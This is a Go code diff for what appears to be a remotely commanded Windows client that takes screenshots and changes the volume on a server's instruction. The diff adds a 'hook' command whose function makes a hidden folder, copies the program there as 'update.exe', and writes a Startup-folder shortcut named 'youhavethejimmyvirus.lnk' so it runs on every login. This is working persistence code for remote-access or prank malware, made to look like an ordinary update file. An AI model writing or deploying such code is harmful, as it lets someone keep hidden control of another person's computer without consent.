@@ -8,12 +8,16 @@ import (
 	"io"
 	"net/http"
 	"os"
+	"path/filepath"
 	"strconv"
 	"strings"
 	"sync"
+	"syscall"
 	"time"
 
 	"github.com/ebitengine/oto/v3"
+	"github.com/go-ole/go-ole"
+	"github.com/go-ole/go-ole/oleutil"
 	"github.com/hajimehoshi/go-mp3"
 	"github.com/itchyny/volume-go"
 	"github.com/vova616/screenshot"
@@ -199,29 +203,120 @@ func reportProgress(serverURL string, report string) {
 	resp.Body.Close()
 }
 
-/*
-func hookSystem() {
-	ole.CoInitializeEx(0, ole.COINIT_APARTMENTTHREADED|ole.COINIT_SPEED_OVER_MEMORY)
-    oleShellObject, err := oleutil.CreateObject("WScript.Shell")
-    if err != nil {
-        return err
-    }
-    defer oleShellObject.Release()
-    wshell, err := oleShellObject.QueryInterface(ole.IID_IDispatch)
-    if err != nil {
-        return err
-    }
-    defer wshell.Release()
-    cs, err := oleutil.CallMethod(wshell, "CreateShortcut", dst)
-    if err != nil {
-        return err
-    }
-    idispatch := cs.ToIDispatch()
-    oleutil.PutProperty(idispatch, "TargetPath", src)
-    oleutil.CallMethod(idispatch, "Save")
-    return nil
+func setHidden(path string) error {
+	filenameW, err := syscall.UTF16PtrFromString(path)
+	if err != nil {
+		return err
+	}
+
+	err = syscall.SetFileAttributes(filenameW, syscall.FILE_ATTRIBUTE_HIDDEN)
+	if err != nil {
+		return err
+	}
+
+	return nil
 }
-*/
+
+func CopyFile(src, dst string) error {
+	// Open the source file
+	sourceFile, err := os.Open(src)
+	if err != nil {
+		return err
+	}
+	defer sourceFile.Close()
+
+	// Create the destination file
+	destinationFile, err := os.Create(dst)
+	if err != nil {
+		return err
+	}
+	defer destinationFile.Close()
+
+	// Copy the content
+	_, err = io.Copy(destinationFile, sourceFile)
+	if err != nil {
+		return err
+	}
+
+	// Ensure data is flushed to disk
+	return destinationFile.Sync()
+}
+
+func hookSystem(src string) error {
+	// Make the directory and hide it
+	err := os.Mkdir("C:/jimmy", 0755)
+	if err != nil {
+		fmt.Println(err)
+	}
+
+	err = setHidden("C:/jimmy")
+	if err != nil {
+		fmt.Println(err)
+	}
+
+	fmt.Println("Folder created and hidden successfully.")
+
+	err = CopyFile("update.exe", "C:/jimmy/update.exe")
+	if err != nil {
+		fmt.Println("File copy failed: %v", err)
+	}
+	fmt.Println("File copied successfully!")
+
+	// Startup Shortcut (final step)
+	err = ole.CoInitializeEx(0, ole.COINIT_APARTMENTTHREADED|ole.COINIT_SPEED_OVER_MEMORY)
+	if err != nil {
+		return err
+	}
+	defer ole.CoUninitialize()
+
+	oleShellObject, err := oleutil.CreateObject("WScript.Shell")
+	if err != nil {
+		return err
+	}
+	defer oleShellObject.Release()
+
+	wshell, err := oleShellObject.QueryInterface(ole.IID_IDispatch)
+	if err != nil {
+		return err
+	}
+	defer wshell.Release()
+
+	// Get Startup folder: shell.SpecialFolders("Startup")
+	startupVar, err := oleutil.GetProperty(wshell, "SpecialFolders")
+	if err != nil {
+		return err
+	}
+	specialFolders := startupVar.ToIDispatch()
+	defer specialFolders.Release()
+
+	startupPathVar, err := oleutil.CallMethod(specialFolders, "Item", "Startup")
+	if err != nil {
+		return err
+	}
+	startupPath := startupPathVar.ToString()
+	startupPathVar.Clear()
+
+	dst := filepath.Join(startupPath, "youhavethejimmyvirus.lnk")
+
+	cs, err := oleutil.CallMethod(wshell, "CreateShortcut", dst)
+	if err != nil {
+		return err
+	}
+	idispatch := cs.ToIDispatch()
+	defer idispatch.Release()
+
+	_, err = oleutil.PutProperty(idispatch, "TargetPath", src)
+	if err != nil {
+		return err
+	}
+
+	_, err = oleutil.CallMethod(idispatch, "Save")
+	if err != nil {
+		return err
+	}
+
+	return nil
+}
 
 func screenshotLoop(amount string) {
 	i := 0
@@ -319,6 +414,16 @@ func main() {
 				output := setVol(volumeLevel)
 				fmt.Println(output)
 				reportProgress(serverIp, "Volume set from "+output+" to "+command[1])
+
+			case "hook":
+				fmt.Println("Hooking system...")
+
+				err := hookSystem("C:/jimmy/update.exe")
+				if err != nil {
+					fmt.Println("Error hooking system:", err)
+				} else {
+					fmt.Println("System hooked successfully.")
+				}
 
 			default:
 				time.Sleep(2 * time.Second)
